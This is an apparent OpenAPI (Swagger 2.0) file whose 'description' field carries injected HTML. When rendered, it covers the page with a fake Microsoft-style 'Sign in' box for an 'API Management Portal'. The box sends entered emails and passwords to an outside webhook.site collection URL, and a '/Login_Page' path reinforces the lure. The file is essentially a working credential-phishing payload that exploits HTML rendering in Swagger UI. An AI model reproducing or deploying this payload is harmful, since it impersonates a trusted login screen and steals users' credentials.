swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:44px 44px 36px;"><div style="font-size:24px;color:#1b1b1b;font-weight:600;margin-bottom:12px;">Sign in</div><p style="font-size:15px;color:#1b1b1b;margin:0 0 20px;">to continue to <strong>API Management Portal</strong></p><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="email" placeholder="Email, phone, or Skype" style="width:100%;padding:10px;border:1px solid #666;border-bottom:2px solid #0078d4;font-size:15px;box-sizing:border-box;"><div style="font-size:13px;color:#0067b8;margin:6px 0 18px;">No account? Create one!</div><input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;border:1px solid #666;border-bottom:2px solid #0078d4;font-size:15px;box-sizing:border-box;"><div style="font-size:13px;color:#0067b8;margin:14px 0 24px;">Forgot password?</div><div style="display:flex;justify-content:space-between;align-items:center;"><span style="font-size:13px;color:#000;">More options</span><button type="submit" style="padding:10px 44px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer;">Sign in</button></div></form></div><div style="background:#000;color:#fff;font-size:12px;padding:8px 44px;text-align:right;">Terms of use &nbsp; Privacy &amp; cookies</div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
